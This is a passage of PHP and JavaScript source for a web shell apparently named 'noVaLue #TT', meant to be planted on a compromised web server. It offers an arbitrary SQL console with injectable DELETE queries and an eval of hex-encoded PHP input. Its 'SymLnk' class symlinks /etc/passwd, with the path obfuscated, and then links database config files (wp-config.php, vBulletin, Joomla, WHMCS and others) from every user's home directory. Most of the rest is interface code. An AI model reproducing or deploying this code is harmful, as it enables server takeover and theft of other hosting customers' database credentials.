				if($_SESSION['dbqt'] == "assoc")
					echo "<option value='assoc' selected='selected'>Assoc</option>";
				else
					echo "<option value='assoc'>Assoc</option>";	
					
				echo "</select></td></tr><tr align='center'><td colspan=2><textarea name='sqlquery' style='width:100%; height:100;'>{$_SESSION['dbquery']}</textarea></td></tr>
						<tr align='center'><td colspan=2><input type='submit' name='reqsend' value='Exec SQL'></td></tr></table></form>";
			
				if(isset($_GET['db']) && isset($_GET['tb'])) {
					echo "<form action='?t-t&db={$_GET['db']}&tb={$_GET['tb']}' method='post'>
					<table align=center bgcolor='#99CC00'><tr><td></td><td>Column</td><td>Value</td><td></td></tr>
					<tr align='center'><td>Delete Entry:</td><td><input type='text' name='column'></td><td><input type='text' name='value'></td><td><input type='submit' value='Exec'></td></tr></table></form>";
					
					if(isset($_POST['column']) && isset($_POST['value'])) {
						$sql = "DELETE FROM {$_GET['db']}.{$_GET['tb']} WHERE {$_POST['column']}='{$_POST['value']}'";
						echo $sql;
						mysql_query($sql);
					}
				}
				
				echo "<table width=100 align='left' bgcolor='#CC6600'>";
				$sql = "SHOW DATABASES";
				$result = mysql_query($sql);
		
				if(mysql_num_rows($result) > 0) {
					while ($row = mysql_fetch_row($db_list)) {
						echo "<tr bgcolor='#000000'><td align=center><a href=?t-t&db={$row[0]}><font color='#FFFF00'style='font-size:12px; font-family:arial;font-weight:bold'>{$row[0]}</font></a></td></tr>";
						if(isset($_GET['db']) && $_GET['db'] == $row[0]) {
							$sql = "SHOW TABLES FROM {$_GET['db']}";
							$result = mysql_query($sql);
							$alter = 0;
								
							while ($row = mysql_fetch_row($result)) {
								if($alter == 0) {
									echo "<tr bgcolor='#333333'><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=?t-t&db={$_GET['db']}&tb=$row[0]><font color='#66CCFF' style='font-size:9px; font-family:arial'>{$row[0]}</font></a></td></tr>";
									$alter = 1;
								}else {
									echo "<tr bgcolor='#666666'><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=?t-t&db={$_GET['db']}&tb=$row[0]><font color='66CCFF' style='font-size:9px; font-family:arial'>{$row[0]}</font></a></td></tr>";
									$alter = 0;
								}
							}
						}
					}				
				}else {
					$sql = "SELECT schema_name FROM information_schema.schemata";
					$result = mysql_query($sql);
							
					while ($row = mysql_fetch_row($result)) {
						echo "<tr bgcolor='#000000'><td align=center><a href=?t-t&db={$row[0]}><font color='#FFFF00'style='font-size:12px; font-family:arial;font-weight:bold'>{$row[0]}</font></a></td></tr>";
								
						if(isset($_GET['db']) && $_GET['db'] == $row[0]) {
							$sqlGETDB = "SHOW TABLES FROM {$_GET['db']}";
							$resultGETDB = mysql_query($sqlGETDB);
							$alter = 0;
									
							while ($rowGETDB = mysql_fetch_row($resultGETDB)) {
								$content = "";
								if($alter == 0) { $content .= "<tr bgcolor='#333333'>"; $alter = 1; }
								else { $content .= "<tr bgcolor='#666666'>"; $alter = 0; }
								$content .= "<td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=?t-t&db={$_GET['db']}&tb=$rowGETDB[0]><font color='#66CCFF' style='font-size:9px; font-family:arial'>{$rowGETDB[0]}</font></a></td></tr>";				
								echo $content ;
							}
						}
					}
							
					if(isset($_GET['dbcross']) && $_GET['dbcross'] != "") {
						echo "<tr bgcolor='#000000'><td align=center><a href=?t-t&db={$_GET['dbcross']}><font color='#FFFF00'style='font-size:12px; font-family:arial;font-weight:bold'>{$_GET['dbcross']}</font></a></td></tr>";
						$sqlGETDB = "SHOW TABLES FROM {$_GET['dbcross']}";
						$resultGETDB = mysql_query($sqlGETDB);
						$alter = 0;
											
						while ($rowGETDB = mysql_fetch_row($resultGETDB)) {
							$content = "";
							if($alter == 0) { $content .= "<tr bgcolor='#333333'>"; $alter = 1; }
							else { $content .= "<tr bgcolor='#666666'>"; $alter = 0; }
							$content .= "<td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=?t-t&db={$_GET['dbcross']}&tb=$rowGETDB[0]><font color='#66CCFF' style='font-size:9px; font-family:arial'>{$rowGETDB[0]}</font></a></td></tr>";			
							echo $content ;
						}
					}
				}
				echo "</table><table align='left' width=80%";
				
				if(isset($_GET['db']) && isset($_GET['tb'])) {
					$sql = "SHOW COLUMNS FROM {$_GET['db']}.{$_GET['tb']}";
					$result = mysql_query($sql);
					echo "<tr  bgcolor='#999999'>";
					while ($row_col = mysql_fetch_row($result))
						echo "<td bgcolor='#425666' align='center'><font color='#FFFFFF' style='font-size:12px; font-family:arial; font-weight:bold'>{$row_col[0]}</font></td>";
					echo "</tr>"; 
							
					$sql = "SELECT * FROM {$_GET['db']}.{$_GET['tb']}";
					$result = mysql_query($sql);
					while ($row_line = mysql_fetch_row($result)) {
						echo "<tr bgcolor='#999999'>";
						for($i=0; $i<sizeof($row_line); $i++) {
							$content = $row_line[$i];
							$content = str_replace("<", "&lt;", $content);
							$content = str_replace(">", "&gt;", $content);
							echo "<td bgcolor='#425666'>{$content}</td>";
						}
						echo "</tr>";
					}
				}
				
				echo"</table>";
			}
		}
	}
}

class SysCMD extends Util {
	public function doEvalTab() {
		$content = '<table align=center width=80% bgcolor="#666666">
						<tr><td align=center bgcolor="black"><font color="#FF3300">PHP Eval System</font></td></tr>
						<tr><td align=center bgcolor="black">
							<textarea id="pad" cols=100 rows=25 style="border:double; border-color:#9F0">'.$stock.'</textarea></td></tr></table>';
		
		$this->dPlay($content);
	}
	public function doEval($evcont) {
		eval($this->hexToStr($evcont));
	}
}

class SymLnk extends Util {
	public function gen_sym($path, $starts, $ends) {
		if(function_exists("symlink")) {
			if(strlen($ends) == 0)
				return;
				
			$lnk = $this->str_fromArray($this->path_strip($path), "/", "path");
			$pawd= "";
			
			if(is_dir($lnk)) {
				$pawd = $lnk."/passwd";
				symlink("/et"."c/pa"."sswd", $pawd);
			}else {
				if(mkdir('asym')) {
					$lnk = $this->str_fromArray($this->path_strip(dirname(__FILE__)."/asym"), "/", "path");
					
					$pawd = $lnk."/passwd";
					symlink("/et"."c/pa"."sswd", $pawd);
				}else {
					$this->dPlay("<center>Warning: Directory can't be created.</center>");
					return;
				}
			}
				
			if(is_file($pawd)) {
				if(is_array($passwd = file($pawd))) {
					foreach($passwd as $usr) {
						$disUsr = explode(":", $usr);
		
						$data['lnk'] = $lnk;
						$data['name'] = $disUsr[0];
						$data['dir'] = $disUsr[5];
						$data['ends'] = $ends;
						
						if(strlen($starts) > 0)
							if(!$this->str_startsWith($starts, $data['dir']))
								continue;

						$this->gen_sym_list($data);
					}
				}
			}else {
				if(is_array($passwd = file($this->hexToStr('2f6574632f706173737764')))) {
					foreach($passwd as $usr) {
						$disUsr = explode(":", $usr);
							
						$data['lnk'] = $lnk;
						$data['name'] = $disUsr[0];
						$data['dir'] = $disUsr[5];
						$data['ends'] = $ends;
						
						if(strlen($starts) > 0)
							if(!$this->str_startsWith($starts, $data['dir']))
								continue;
						
						$this->gen_sym_list($data);
					}
				}
			}
		}else {
			$this->dPlay("<center>Warning: Function disabled.</center>");
		}
	}
	
	private function gen_sym_list($data) {
		symlink($data['dir'].$data['ends'].'/vb/includes/config.php', $data['lnk'].'/'.$data['name'].'~~vBulletin1.txt');
		symlink($data['dir'].$data['ends'].'/includes/config.php',$data['lnk'].'/'.$data['name'].'~~vBulletin2.txt');
		symlink($data['dir'].$data['ends'].'/forum/includes/config.php',$data['lnk'].'/'.$data['name'].'~~vBulletin3.txt');
		symlink($data['dir'].$data['ends'].'/cc/includes/config.php',$data['lnk'].'/'.$data['name'].'~~vBulletin4.txt');
		symlink($data['dir'].$data['ends'].'/config.php',$data['lnk'].'/'.$data['name'].'~~Phpbb1.txt');
		symlink($data['dir'].$data['ends'].'/forum/config.php',$data['lnk'].'/'.$data['name'].'~~Phpbb3.txt');
		symlink($data['dir'].$data['ends'].'/wp-config.php',$data['lnk'].'/'.$data['name'].'~~Wordpress1.txt');
		symlink($data['dir'].$data['ends'].'/blog/wp-config.php',$data['lnk'].'/'.$data['name'].'~~Wordpress2.txt');
		symlink($data['dir'].$data['ends'].'/configuration.php',$data['lnk'].'/'.$data['name'].'~~Joomla1.txt');
		symlink($data['dir'].$data['ends'].'/blog/configuration.php',$data['lnk'].'/'.$data['name'].'~~Joomla2.txt');
		symlink($data['dir'].$data['ends'].'/joomla/configuration.php',$data['lnk'].'/'.$data['name'].'~~Joomla3.txt');
		symlink($data['dir'].$data['ends'].'/whm/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm1.txt');
		symlink($data['dir'].$data['ends'].'/whmc/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm2.txt');
		symlink($data['dir'].$data['ends'].'/support/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm3.txt');
		symlink($data['dir'].$data['ends'].'/client/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm4.txt');
		symlink($data['dir'].$data['ends'].'/billings/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm5.txt');
		symlink($data['dir'].$data['ends'].'/billing/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm6.txt');
		symlink($data['dir'].$data['ends'].'/clients/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm7.txt');
		symlink($data['dir'].$data['ends'].'/whmcs/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm8.txt');
		symlink($data['dir'].$data['ends'].'/order/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm9.txt');
		symlink($data['dir'].$data['ends'].'/clienti/configuration.php',$data['lnk'].'/'.$data['name'].'~~Whm10.txt');
		symlink($data['dir'].$data['ends'].'/conf_global.php',$data['lnk'].'/'.$data['name'].'~~invisio.txt');
		symlink($data['dir'].$data['ends'].'/mk_conf.php',$data['lnk'].'/'.$data['name'].'~~mk-portale1.txt');
		symlink($data['dir'].$data['ends'].'/include/config.php',$data['lnk'].'/'.$data['name'].'~~12.txt');
		symlink($data['dir'].$data['ends'].'/settings.php',$data['lnk'].'/'.$data['name'].'~~Smf.txt');
		symlink($data['dir'].$data['ends'].'/includes/functions.php',$data['lnk'].'/'.$data['name'].'~~phpbb3.txt');
		symlink($data['dir'].$data['ends'].'/include/db.php',$data['lnk'].'/'.$data['name'].'~~infinity.txt');
	}	
}

class nVShl extends Util{
	var $NVL_ink, $_T_start, $_T_stop;

	function nVShl($NVLink) {
		$this->NVL_ink = $NVLink;
	}

	///////////////////////////////////////////////  Top - Header Part  ///////////////////////////////////////////////////////////////////////
	public function top($section) {
		$this->_T_start = microtime(true);
		$content = '<html><title>noVaLue #TT - '.$section.'</title><head>';
		$content .= '<script type="text/javascript">
						//window.onbeforeunload = function() {
						//	return "Are you sure you wish to leave this page?";
						//}
						function findPosX(obj) {
							var curleft = 0;
							if(obj.offsetParent)
								while(1) {
									curleft += obj.offsetLeft;
									if(!obj.offsetParent)
										break;
									obj = obj.offsetParent;
								}
							else if(obj.x)
								curleft += obj.x;
							return curleft;
						}
					
						function findPosY(obj) {
							var curtop = 0;
							if(obj.offsetParent)
								while(1) {
									curtop += obj.offsetTop;
									if(!obj.offsetParent)
										break;
									obj = obj.offsetParent;
								}
							else if(obj.y)
								curtop += obj.y;
							return curtop;
						}
						
						function encToHex(str){
							var alph = new Array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f");
							var output = "";
							var charVal;
							for(var i=0; i<str.length; i++) {
								charVal = str.charCodeAt(i);
								output += alph[Math.floor(charVal/16)] + alph[charVal%16];
							}
							return output;
						}
						
						function decToStr(str){
							var output = "";
							for (var i = 0; i < str.length; i += 2) {
								output += String.fromCharCode(parseInt(str.substr(i, 2), 16));
							}
							return output;
						}
						
						function xhr(tp, act, val, fId,  pt/*Post*/, dt/*Data*/, dup/*Data Upload*/, fl/*File if set*/) {
							var xhr;
		
							var frm  = fId|| "none";
							var type = pt || "GET";
							var data = dt || "";
							var updt = dup|| false;
							var file = fl || null;
					
							if(tp.length == 0 || act.length == 0 || val.length ==0) {
								if(frm != "none")
									return "[xhr]Error: Invalid request.";	
								return;
							}
							
							if(window.XMLHttpRequest) {
								xhr = new XMLHttpRequest();
							}else {
								xhr = new ActiveXObject("Microsoft.XMLHTTP");	
							}
						
							xhr.onreadystatechange = function() {
								if(xhr.readyState == 4 && xhr.status == 200) {
									if(frm instanceof popup_file) {
										var body = frm.getFileBody();
										body.innerHTML = xhr.responseText;
									}else if(frm != "none") {
										document.getElementById(frm).innerHTML = xhr.responseText;
									}else {
										frm = xhr.responseText;
									}
										
									parseScript(xhr.responseText);
								}			
							}
							
							xhr.open(type, "?tp="+tp+"&act="+act+"&val="+encToHex(val), false); 
						
							if(type == "POST") {
								// Daca uploadez fisier
								if(updt) {
									var frmData = new FormData();
									
									frmData.append("updt", updt);
									
									if(data.length > 0) 
										frmData.append("data", data);
									
									if(file instanceof Object && file != null)
										frmData.append("upNFile", file);	
									
									xhr.send(frmData);
								}else {
									if(data.length > 0) {
										var fdata = "updt="+updt+"&data="+data;
										xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
										xhr.send(fdata);
									}
								}
							}else {
								xhr.send(null);	
							}
						}
						
						function parseScript(strcode) {
							var scripts = new Array();        
						
							while(strcode.indexOf("<script") > -1 || strcode.indexOf("</script") > -1) {
								var s = strcode.indexOf("<script");
								var s_e = strcode.indexOf(">", s);
								var e = strcode.indexOf("</script", s);
								var e_e = strcode.indexOf(">", e);
								
								// Add to scripts array
								scripts.push(strcode.substring(s_e+1, e));
								// Strip from strcode
								strcode = strcode.substring(0, s) + strcode.substring(e_e+1);
							}
						
							for(var i=0; i<scripts.length; i++) {
								try {
									eval(scripts[i]);
								}
								catch(ex) {}
							}
						}
				</script>';
				
				$content .= '<script type="text/javascript">	
					var PathSystem = function() {
						this.checkTimeout = null;
						
						this.auto_complete = function(e, input) {
							if((e.keyCode <= 32 || e.keyCode > 90) && (e.keyCode != 8 && e.keyCode != 9 && e.keyCode != 173 && e.keyCode != 190 && e.keyCode != 191 && e.keyCode != 220))return;
							
							if(checkTimeout != undefined) clearTimeout(checkTimeout);
							checkTimeout = setTimeout(function() { auto_check(input); }, 1000);
						}
					
						this.auto_check = function(input) {
							if(input.value != "") {
								var result = "none";
								xhr("1", "check_path", "none", result, "POST", "path:"+encToHex(input.value));
								while(result == "none") {}
								this.auto_check_display(input, result);
							}
						}
						
						this.auto_check_display = function(input, result) {
							
						}
					}
				</script>';
				
				$content .= '<script type="text/javascript">
					var TabSys = function() {
						this.container = "TabView";
						this.selectedTab = 1;
						this.isRemoving = false;
						this.tabslist = new Array();
						
						//var that = this;
						////////////////////////////////////////////////////////////////////////////////////
						var tabTrack = function() {
							this.tabId = "-1";
							this.tabTitleEle = null;
							
							this.add = function(tId, tTEle) {
								this.tabId = tId;
								this.tabTitleEle = tTEle;
							}
							
							this.getTabId = function() {
								return this.tabId;	
							}
							
							this.setTabTitle = function(name) {
								this.tabTitleEle.innerHTML = name +" "+this.tabId;
							}
						}
						////////////////////////////////////////////////////////////////////////////////////
						this.get_tabs = function() {
							var TabView = document.getElementById(this.container);
						
							var Tabs = TabView.firstChild;
							while (Tabs.className != "Tabs") 
								Tabs = Tabs.nextSibling;
								
							return Tabs;
						}
						
						this.get_pages = function() {
							var TabView = document.getElementById(this.container);
							
							var Pages = TabView.firstChild;
							while (Pages.className != "Pages")
								Pages = Pages.nextSibling;
								
							return Pages;
						}
						this.get_footer_tabs = function() {
							var TabView = document.getElementById(this.container);
							
							var Footer = TabView.firstChild;
							while (Footer.className != "FooterTabs")
								Footer = Footer.nextSibling;
								
							return Footer;
						}
						
						this.getSelected = function() {
							return this.selectedTab;
						}
						
						this.getTabOnId = function(id) {
							var tObj = null;
							
							for(var obj in this.tabslist) {
								if(parseInt(this.tabslist[obj].getTabId()) == parseInt(id)) {
									tObj = this.tabslist[obj];
									break;
								}
							}
							
							return tObj;
						}
			
						////////////////////////////////////////////////////////////////////////////////////
						this.tab_count = function() {
							var Tab = this.get_tabs().firstChild;
							var i = 0;
							
							while (Tab = Tab.nextSibling) {
								if (Tab.tagName == "DIV") {
									i++;
								}
							}
							
							return i;
						}
						////////////////////////////////////////////////////////////////////////////////////////////////////////
						///////////////////////////////////////  TAB  SWITCH  UI    ////////////////////////////////////////////
						////////////////////////////////////////////////////////////////////////////////////////////////////////
						
						// Tab Parts: tab_switch
						this.tab_switch = function(id) {
							var Tab  = this.get_tabs().firstChild;
			
							while (Tab = Tab.nextSibling) {
								if (Tab.tagName == "DIV") {
									Tab.className = (Tab.id == "hqt"+id) ? "Current" : "";
									Tab.blur();
								}
							}
						}
						
						this.tab_switch_update_ui = function() {
							var Tab = this.get_tabs().firstChild;
							while (Tab = Tab.nextSibling) {
								if(Tab.tagName == "DIV") {
									Tab.firstChild.style.display = (this.tab_count() == 1) ? "none":"block";
								}
							}
						}
						
						// Tab Parts: page_switch
						this.page_switch = function(id) {
							var Page  = this.get_pages().firstChild;
			
							while (Page = Page.nextSibling) {
								if (Page.tagName == "DIV") {
									Page.style.display  = (Page.id == "hqp"+id) ? "block" : "none";
								}
							}
						}
						// Tab Parts: footer_tab_switch
						this.footer_tab_switch = function(id) {
							var Footer_Tab  = this.get_footer_tabs().firstChild;
			
							while (Footer_Tab = Footer_Tab.nextSibling) {
								if (Footer_Tab.tagName == "DIV") {
									Footer_Tab.style.display  = (Footer_Tab.id == "hqft"+id) ? "block" : "none";
								}
							}
						}
						
						////////////////////////////////////////////////////////////////////////////////////////////////////////
						/////////////////////////////////////////  ADD  TAB / PAGE   ///////////////////////////////////////////
						////////////////////////////////////////////////////////////////////////////////////////////////////////
						
						this.add_tab = function(name) {
							var setName = name || "";
							var id = 1;
							while(this.tab_exists(id)) id++;
							this.add_update_ui(id, setName);
							
							xhr("0", "none", "none", "hqp"+id);
						}
						
						this.add_update_ui = function(id, name) {
							this.tab_add(id, name);
							this.page_add(id);
							this.footer_tab_add(id);
							this.switch_tab(id);
							this.tab_switch_update_ui();
						}
						
						////////////////////////////////////////////////////////////////////////////////////
						this.tab_add = function(id, name) {
							var Tabs = this.get_tabs();	
				
							var newTab = document.createElement("div"),
								tabText = document.createElement("div"),
								tabClose = document.createElement("input");
								
							newTab.setAttribute("id", "hqt"+id);
							
							tabClose.setAttribute("type", "button");
							tabClose.setAttribute("style", "float: right;");
							tabClose.setAttribute("id", "ctp_"+id);
							tabClose.setAttribute("onclick", "tabSystem.remove_tab(this);");
							newTab.appendChild(tabClose);
							
							if(name == "")
								tabText.innerHTML = "Tab "+id;
							else 
								tabText.innerHTML = name +" "+id;
							tabText.setAttribute("style", "float: left;");
							newTab.appendChild(tabText);
							
							var tTrack = new tabTrack();
							tTrack.add(id, tabText);
							this.tabslist.push(tTrack);
						
							newTab.setAttribute("onclick", "tabSystem.switch_tab("+id+");");
							Tabs.insertBefore(newTab, document.getElementById("hqa"));
						}
						
						this.tab_exists = function(id) {
							var Tab = this.get_tabs().firstChild;
			
							while(Tab = Tab.nextSibling) {
								if(Tab.tagName == "DIV") {
									if(Tab.id == "hqt"+id)
										return true;
								}
							}
							return false;
						}
						
						////////////////////////////////////////////////////////////////////////////////////
						this.page_add = function(id) {
							var Pages = this.get_pages();	
				
							var newPage = document.createElement("div");
								
							newPage.setAttribute("id", "hqp"+id);
							newPage.setAttribute("class", "Page");
						
							Pages.appendChild(newPage);
						}
			
						this.footer_tab_add = function(id) {
							var Footer = this.get_footer_tabs();	
				
							var newFooterList = document.createElement("div");
								
							newFooterList.setAttribute("id", "hqft"+id);
							newFooterList.setAttribute("class", "FooterList");
							
							Footer.appendChild(newFooterList);
						}
						
						////////////////////////////////////////////////////////////////////////////////////////////////////////
						/////////////////////////////////////////  REM  TAB / PAGE   ///////////////////////////////////////////
						////////////////////////////////////////////////////////////////////////////////////////////////////////
						this.remove_tab = function(e) {
							var id = e.id.split("_")[1];
							
							this.remove_update_ui(id);
						}
						
						this.remove_update_ui = function(id) {
							var lastTab = this.get_last_tab(id);
							
							// Remove Tab by (id)
							this.tab_remove(id);
							this.page_remove(id);
							this.footer_tabs_remove(id);
							this.remove_from_tabtrack(id);
								
							if(lastTab > 0) {
								// Switch on last created
								this.switch_tab(lastTab);
								this.tab_switch_update_ui();
								this.isRemoving = true;
							}
						}
						
						this.remove_from_tabtrack = function(id) {
							var tObj = this.getTabOnId(id);
							
							if(tObj != null) {
								this.tabslist.splice(this.tabslist.indexOf(tObj), 1);
							}
						}
						
						this.switch_tab = function(id) {
							if(!this.isRemoving) {
								this.tab_switch(id);
								this.page_switch(id);
								this.footer_tab_switch(id);
								this.selectedTab = id;
							}else 
								this.isRemoving = false;
						}
						
						this.get_last_tab = function(id) {
							var Tab = this.get_tabs().lastChild;
							var triggerTab = null;
							var lTab = 0;
							var lRetTab = false;
							
							while(Tab = Tab.previousSibling) {
								if(Tab.tagName == "DIV") {
									if(Tab.id == "hqt"+id) {
										if(triggerTab != null)
											return lTab;
										else
											lRetTab = true;
									}else {
										triggerTab = Tab;
										lTab = Tab.id.split("hqt")[1];
		
										if(lRetTab)
											return lTab;
									}
								}
							}
						}
						
						////////////////////////////////////////////////////////////////////////////////////
						this.tab_remove = function(id) {
							var Tabs = this.get_tabs();	
							var Node = document.getElementById("hqt"+id);
							Tabs.removeChild(Node);
						}
						this.page_remove = function(id) {
							var Pages = this.get_pages();	
							var Node = document.getElementById("hqp"+id);
							Pages.removeChild(Node);
						}
						this.footer_tabs_remove = function(id) {
							var FooterTabs = this.get_footer_tabs();	
							var Node = document.getElementById("hqft"+id);
							FooterTabs.removeChild(Node);
						}
					}
					
					</script>';
				
				$content .= '<script type="text/javascript">
					/////////////////////////////////////////////////////////////////////////////////
					/////////////////////////////   Object: File Editor   ///////////////////////////
					/////////////////////////////////////////////////////////////////////////////////
					var popupSys = function() {
						this.editorObjs = new Array();	
						
						var that = this;
						
						this.add = function(popupFile, fName) {
							var editor = new Array();
							
							var nfName = fName.replace("<", "&lt;");
							nfName = nfName.replace(">", "&gt;");
							
							var ele_form = document.createElement("div");
							ele_form.setAttribute("style", "background:#111111");
							ele_form.setAttribute("style", "display:none");
							
							var ele_top = document.createElement("div");
							ele_top.setAttribute("style", "background:#700040");
							ele_top.innerHTML = "&nbsp;&nbsp;&nbsp;&nbsp;<b>Editing<b>";
							
							var ele_top_exit = document.createElement("img");
							ele_top_exit.setAttribute("align", "right");
							ele_top_exit.setAttribute("src", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAALCAIAAAAmzuBxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABgUlEQVR42gF2AYn+AbW7wuLn7QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATi5+2aj4IJCQn5+fn6+vr5+fn4+Pj5+fn8/Pz7+/v6+voEAAAACQkJHSw+/f8AGyEm/v7///8A/QAA8enjCQkJo5F9AgAAAPj4+P3/AM/GvOHd2vz+//z//+Xd2cC0pvHs6fz8/AQAAAD7+/sbISb8/gC6qZdFVWgAAADUyr0yPUoMDhD///8EAAAA9/f3/v7/GR8kRVVozsO16+bgR1drFxoc9u7mAAAAAgAAAPn5+f//AP/9AAAAAAAAAAD//wAAAP/+/fz7+QAAAAQAAAD5+fn+//7n4927q5hFVWgAAADTybwpLzYJBgIAAAACAAAA+/v75d3W08i5RFNjFxocFhcXKS82zcO37+vmAAAABAAAAPz8/P37+SgsMxEQD/bu5vv6+QkGAisuMf/7+gAAAAQAAAD6+vq5q5v8/PwAAAAAAAAAAAAAAAAAAAAAAAD///+plK6Im7jGMgAAAABJRU5ErkJggg==");
							ele_top_exit.onmouseover = function(e) {
								this.setAttribute("style", "cursor:pointer");
							};
							
							ele_top.appendChild(ele_top_exit);
							
							var ele_body = document.createElement("div");
							ele_body.innerHTML = "<table width=\'100%\' bgcolor=\'#666666\'><tr><td bgcolor=\'black\' align=\'center\'>&nbsp;<font color=\'green\'>"+nfName+"</font></td></tr><tr><td bgcolor=\'black\'><textarea id=\'pad\' cols=100 rows=25 style=\'border:double; border-color:#9F0\'></textarea></td></tr></table><table width=\'100%\' bgcolor=\'#666666\'><tr><td bgcolor=\'black\'>&nbsp;</td></tr><tr><td align=\'center\' bgcolor=\'black\'><input align=\'left\' type=\'button\' value=\'Delete\'><input align=\'center\' type=\'button\' value=\'Edit\'><input align=\'right\' type=\'button\' value=\'Save\'></td></tr></table>";

							var ele_bottom_tab = document.createElement("div");
							ele_bottom_tab.setAttribute("class", "Tab");
							ele_bottom_tab.onmouseover = function(e) {
								ele_top.setAttribute("style", "background:#00366F");
							};
							ele_bottom_tab.onmouseout = function(e) {
								ele_top.setAttribute("style", "background:#700040");
							};
							ele_bottom_tab.onclick = function(e) {
								that.reposition();
								that.focus(popupFile, true);
							};
							ele_bottom_tab.innerHTML = nfName;
							
							ele_form.appendChild(ele_top);
							ele_form.appendChild(ele_body);
		
							document.getElementById(popupFile.getTabId()).appendChild(ele_form);
							document.getElementById(popupFile.getSubTabId()).appendChild(ele_bottom_tab);
							
							editor.push(ele_form);
							editor.push(ele_bottom_tab);
							editor.push(popupFile);
							
							popupFile.setFileBody(ele_body);
							popupFile.setFileBottomTab(ele_bottom_tab);
							popupFile.popup_file_show(ele_form, ele_top, ele_top_exit);
							
							this.editorObjs.push(editor);
							this.reposition();
							this.focus(popupFile);
							
							return popupFile;
						};
						
						this.rem = function(popupFile) {
							for(var editor in this.editorObjs) {
								var edArray = this.editorObjs[editor];
								
								for(var pop in edArray) {
									var popArray = edArray[pop];
									
									if(edArray[pop] instanceof popup_file) {
										if(edArray[pop] == popupFile) {
											this.editorObjs.splice(editor, 1);
											document.getElementById(popupFile.getSubTabId()).removeChild(popupFile.getFileBottomTab());
										}
									}
								}
							}
							
							if(this.editorObjs.length > 0) {
								for(var editor in this.editorObjs[this.editorObjs.length-1]) {
									var popArray = this.editorObjs[this.editorObjs.length-1];
									
									if(popArray instanceof popup_file) {
										this.focus(popArray);
									}
								}
							}
							
							return popupFile;
						};
						
						this.focus = function(popupFile, fsubtab) {
							var fst = fsubtab || false;
							this.changeSubTabFocus(popupFile);
							
							var editor_tmp;
							for(var editor in this.editorObjs) {
								var edArray = this.editorObjs[editor];
								
								for(var pop in edArray) {
									var popArray = edArray[pop];
									
									if(edArray[pop] instanceof popup_file) {
										if(edArray[pop] == popupFile) {
											var editor_tmp = edArray;
		
											this.editorObjs.splice(editor, 1);
											this.editorObjs.push(editor_tmp);
											
											for(var edTMP in editor_tmp) {
												if(editor_tmp[edTMP] instanceof popup_file) {
													if(editor < this.editorObjs.length-1 || fst)
														document.getElementById(editor_tmp[edTMP].getTabId()).appendChild(editor_tmp[edTMP].popup_file_element);
												}
											}
											
										}
									}
								}
							}
						};
						
						this.reposition = function() {
							for(var editor in this.editorObjs) {
								var edArray = this.editorObjs[editor];
								
								for(var pop in edArray) {
									var popArray = edArray[pop];
									
									if(popArray instanceof popup_file) {
										popArray.popup_file_reposition();
									}
								}
							}
						};
						
						this.changeSubTabFocus = function(popupFile) {
							for(var editor in this.editorObjs) {
								var edArray = this.editorObjs[editor];
								
								for(var pop in edArray) {
									var popArray = edArray[pop];
									
									if(!(popArray instanceof popup_file)) {
										if(popArray.getAttribute("class") == "Tab" || popArray.getAttribute("class") == "Tab active") {
											if(popArray == popupFile.getFileBottomTab()) {
												popArray.setAttribute("class", "Tab active");
											}else {
												popArray.setAttribute("class", "Tab");
											}
										}
									}
								}
							}
						}
					}
					
					</script>';
				
				$content .= '<script type="text/javascript">
				
					var popup_file = function(tabid) {
						this.popup_file_tabid = "hqp"+tabid || "hqp-1";
						this.popup_file_subtabid = "hqft"+tabid || "hqft-1";
						this.popup_file_name;
						this.popup_file_dragging = false;
						this.popup_file_element;
						this.popup_file_body;
						this.popup_file_bottom_tab;
						this.popup_file_mouseX;
						this.popup_file_mouseY;
						this.popup_file_mouseposX;
						this.popup_file_mouseposY;
						this.popup_file_oldfunction;
						
						var that = this;
						
						// ***** getTabId *******************************************************************
						this.getTabId = function() {
							return this.popup_file_tabid;
						};
						this.getSubTabId = function() {
							return this.popup_file_subtabid;
						};
						
						this.getFileBody = function() {
							return this.popup_file_body;
						};
						
						this.setFileBody = function(obj) {
							this.popup_file_body = obj;
						};
						
						this.getFileBottomTab = function() {
							return this.popup_file_bottom_tab;
						};
						this.setFileBottomTab = function(obj) {
							this.popup_file_bottom_tab = obj;
						};
						
						this.getBottomTabY = function() {
							return findPosY(document.getElementById(this.popup_file_subtabid));
						}
						
						// ***** popup_file_mouseup *********************************************************
						this.popup_file_mouseup = function(e) {
							if (!that.popup_file_dragging) return;
		
							that.popup_file_reposition();				
							that.popup_file_dragging = false;
			
							document.onmousedown = that.popup_file_oldfunction;
						};
						
						// ***** popup_file_mousedown_window ************************************************
						this.popup_file_mousedown_window = function(e) {
							if (e.button != 0) return;
						
							that.popup_file_dragging = true;
							
							that.popup_file_mouseX = e.clientX;
							that.popup_file_mouseY = e.clientY;
							
							that.popup_file_oldfunction = document.onmousedown;
							document.onmousedown   = new Function("return false;");
						};
						
						this.popup_file_window = function(e) {
							if (e.button != 0) return;
							
							popupSystem.focus(that);
						};
						
						// ***** popup_file_mousedown *******************************************************
						this.popup_file_mousedown = function(e) {
							that.popup_file_mouseposX = e.clientX;
							that.popup_file_mouseposY = e.clientY;
						};
						
						// ***** popup_file_mousemove *******************************************************
						this.popup_file_mousemove = function(e) {
							var mouseX = e.clientX;
							var mouseY = e.clientY;
							
							if (!that.popup_file_dragging) return;
							
							that.popup_file_element.style.left = (that.popup_file_element.offsetLeft + mouseX - that.popup_file_mouseX)+"px";
							that.popup_file_element.style.top  = (that.popup_file_element.offsetTop + mouseY - that.popup_file_mouseY)+"px";
						
							that.popup_file_mouseX = e.clientX;
